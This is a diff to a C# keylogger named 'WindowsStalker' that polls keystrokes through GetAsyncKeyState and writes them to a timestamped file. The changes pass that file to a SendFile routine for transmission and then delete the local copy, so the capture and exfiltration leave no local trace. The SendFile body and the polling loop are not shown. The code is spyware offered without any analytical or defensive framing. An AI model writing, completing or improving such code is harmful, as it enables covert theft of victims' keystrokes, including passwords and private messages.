@@ -3,7 +3,6 @@ using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
-using WindowsStalker.Properties;
 
 namespace WindowsStalker
 {
@@ -12,13 +11,15 @@ namespace WindowsStalker
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        public static int loggerTimeUp = 5;
+        public static int loggerTimeUp = 3;
 
         public static void LogKeys()
         {
             Stopwatch s = new Stopwatch();
             s.Start();
-            StreamWriter sr = new StreamWriter("tmp.txt");
+            string filename = DateTime.Now.ToString("MMddyyyy_hmm_tt") + ".txt";
+
+            StreamWriter sr = new StreamWriter(filename);
 
             while (s.Elapsed < TimeSpan.FromSeconds(loggerTimeUp))
             {
@@ -34,7 +35,8 @@ namespace WindowsStalker
             sr.Close();
             s.Stop();
 
-            SendFile("xd");
+            SendFile(filename, 2);
+            File.Delete(filename);
         }
     }
 }
